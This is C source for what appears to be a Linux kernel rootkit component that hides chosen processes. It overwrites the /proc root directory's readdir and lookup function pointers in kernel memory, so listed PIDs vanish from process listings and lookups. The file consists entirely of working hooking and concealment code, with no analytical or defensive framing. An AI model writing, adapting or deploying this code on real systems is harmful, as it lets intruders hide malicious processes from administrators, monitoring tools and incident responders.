#include "hide_proc.h"
#include "inline_hook/utils/p_memory.h" // For remap_write_range
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/spinlock.h>
#include <linux/namei.h> // For filp_open/filp_close
#include <linux/path.h> // For kern_path and d_drop

// --- Original function pointers storage ---
static int (*original_proc_root_readdir)(struct file *, struct dir_context *);
static struct dentry * (*original_proc_root_lookup)(struct inode *, struct dentry *, unsigned int);

// --- Pointers to the VFS operation structs ---
static struct file_operations *proc_root_fops;
static struct inode_operations *proc_root_iops;


// --- PID list management (copied from original) ---
struct hidden_pid_entry {
    struct list_head list;
    pid_t pid;
};

static LIST_HEAD(hidden_pids);
static DEFINE_SPINLOCK(hidden_lock);

bool is_pid_hidden(pid_t pid) {
    struct hidden_pid_entry *entry;
    bool found = false;

    spin_lock(&hidden_lock);
    list_for_each_entry(entry, &hidden_pids, list) {
        if (entry->pid == pid) {
            found = true;
            break;
        }
    }
    spin_unlock(&hidden_lock);

    return found;
}

void add_hidden_pid(pid_t pid) {
    struct hidden_pid_entry *new_entry;
    char path_str[32];
    struct path path;

    if (is_pid_hidden(pid))
        return;

    new_entry = kmalloc(sizeof(struct hidden_pid_entry), GFP_KERNEL);
    if (!new_entry)
        return;

    new_entry->pid = pid;

    spin_lock(&hidden_lock);
    list_add(&new_entry->list, &hidden_pids);
    spin_unlock(&hidden_lock);

    printk(KERN_INFO "[hide_proc] Added PID %d to hidden list\n", pid);

    // Invalidate dcache entry to force re-lookup
    snprintf(path_str, sizeof(path_str), "/proc/%d", (int)pid);
    if (kern_path(path_str, LOOKUP_FOLLOW, &path) == 0) {
        printk(KERN_INFO "[hide_proc] Found dentry for %s, invalidating.\n", path_str);
        d_drop(path.dentry);
        path_put(&path);
    }
}

void remove_hidden_pid(pid_t pid) {
    struct hidden_pid_entry *entry, *tmp;

    spin_lock(&hidden_lock);
    list_for_each_entry_safe(entry, tmp, &hidden_pids, list) {
        if (entry->pid == pid) {
            list_del(&entry->list);
            kfree(entry);
            printk(KERN_INFO "[hide_proc] Removed PID %d from hidden list\n", pid);
            break;
        }
    }
    spin_unlock(&hidden_lock);
}

void clear_hidden_pids(void) {
    struct hidden_pid_entry *entry, *tmp;

    spin_lock(&hidden_lock);
    list_for_each_entry_safe(entry, tmp, &hidden_pids, list) {
        list_del(&entry->list);
        kfree(entry);
    }
    spin_unlock(&hidden_lock);

    printk(KERN_INFO "[hide_proc] Cleared all hidden PIDs\n");
}


// --- New implementation using VFS pointer swapping ---

// --- Hook for readdir ---

struct hooked_dir_context {
    struct dir_context original;
    struct dir_context *original_ctx;
};

static int hooked_filldir(struct dir_context *ctx, const char *name, int namlen,
                          loff_t offset, u64 ino, unsigned int d_type) {
    struct hooked_dir_context *hooked_ctx = container_of(ctx, struct hooked_dir_context, original);
    char *endptr;
    long pid;

    if (name) {
        pid = simple_strtol(name, &endptr, 10);
        if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
            return 0; // Skip this entry
        }
    }

    return hooked_ctx->original_ctx->actor(hooked_ctx->original_ctx, name, namlen, offset, ino, d_type);
}

static int hooked_proc_root_readdir(struct file *file, struct dir_context *ctx)
{
    struct hooked_dir_context hooked_ctx;
    int ret;

    if (!ctx || !ctx->actor) {
        return original_proc_root_readdir(file, ctx);
    }

    hooked_ctx.original_ctx = ctx;
    memcpy(&hooked_ctx.original, ctx, sizeof(struct dir_context));
    *(filldir_t *)(&hooked_ctx.original.actor) = hooked_filldir;

    ret = original_proc_root_readdir(file, &hooked_ctx.original);

    ctx->pos = hooked_ctx.original.pos;

    return ret;
}

// --- Hook for lookup ---

static struct dentry * hooked_proc_root_lookup(struct inode *dir, struct dentry *dentry, unsigned int flags)
{
    char *endptr;
    long pid;
    const char *name;

    printk(KERN_INFO "[hide_proc] lookup called for '%s' by process '%s'\n", dentry->d_name.name, current->comm);

   


    if (dentry && dentry->d_name.name) {
        name = dentry->d_name.name;
        pid = simple_strtol(name, &endptr, 10);
        if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
            return ERR_PTR(-ENOENT);
        }
    }

    return original_proc_root_lookup(dir, dentry, flags);
}


// --- Init and Exit functions ---

int hide_proc_init(void) {
    struct file *proc_root_file;
    struct inode *proc_root_inode;
    void *new_readdir_ptr = &hooked_proc_root_readdir;
    void *new_lookup_ptr = &hooked_proc_root_lookup;

    printk(KERN_INFO "[hide_proc] Initializing process hiding (via VFS pointer swap)\n");

    proc_root_file = filp_open("/proc", O_RDONLY, 0);
    if (IS_ERR(proc_root_file)) {
        printk(KERN_ERR "[hide_proc] Failed to open /proc\n");
        return PTR_ERR(proc_root_file);
    }

    proc_root_inode = file_inode(proc_root_file);
    proc_root_fops = (struct file_operations *)proc_root_inode->i_fop;
    proc_root_iops = (struct inode_operations *)proc_root_inode->i_op;
    filp_close(proc_root_file, NULL);

    if (!proc_root_fops || !proc_root_iops) {
        printk(KERN_ERR "[hide_proc] Failed to get /proc operations\n");
        return -EFAULT;
    }

    // Hook readdir
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
    original_proc_root_readdir = proc_root_fops->iterate_shared;
    if (remap_write_range(&proc_root_fops->iterate_shared, &new_readdir_ptr, sizeof(void *), true)) {
        printk(KERN_ERR "[hide_proc] Failed to hook proc_root_readdir.\n");
        return -EFAULT;
    }
#else
    original_proc_root_readdir = proc_root_fops->readdir;
     if (remap_write_range(&proc_root_fops->readdir, &new_readdir_ptr, sizeof(void *), true)) {
        printk(KERN_ERR "[hide_proc] Failed to hook proc_root_readdir.\n");
        return -EFAULT;
    }
#endif

    // Hook lookup
    original_proc_root_lookup = proc_root_iops->lookup;
    if (remap_write_range(&proc_root_iops->lookup, &new_lookup_ptr, sizeof(void *), true)) {
        printk(KERN_ERR "[hide_proc] Failed to hook proc_root_lookup.\n");
        // Restore readdir hook on failure
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
        remap_write_range(&proc_root_fops->iterate_shared, &original_proc_root_readdir, sizeof(void *), true);
#else
        remap_write_range(&proc_root_fops->readdir, &original_proc_root_readdir, sizeof(void *), true);
#endif
        return -EFAULT;
    }

    printk(KERN_INFO "[hide_proc] Successfully hooked /proc operations.\n");
    return 0;
}

void hide_proc_exit(void) {
    // printk(KERN_INFO "[hide_proc] Exiting process hiding (restoring VFS pointers)\n");

    if (proc_root_fops && original_proc_root_readdir) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)

        remap_write_range(&proc_root_fops->iterate_shared, &original_proc_root_readdir, sizeof(void *), true);
#else
        remap_write_range(&proc_root_fops->readdir, &original_proc_root_readdir, sizeof(void *), true);
#endif
    }

    if (proc_root_iops && original_proc_root_lookup) {
        remap_write_range(&proc_root_iops->lookup, &original_proc_root_lookup, sizeof(void *), true);
    }

    clear_hidden_pids();
    printk(KERN_INFO "[hide_proc] Restored /proc operations.\n");
}
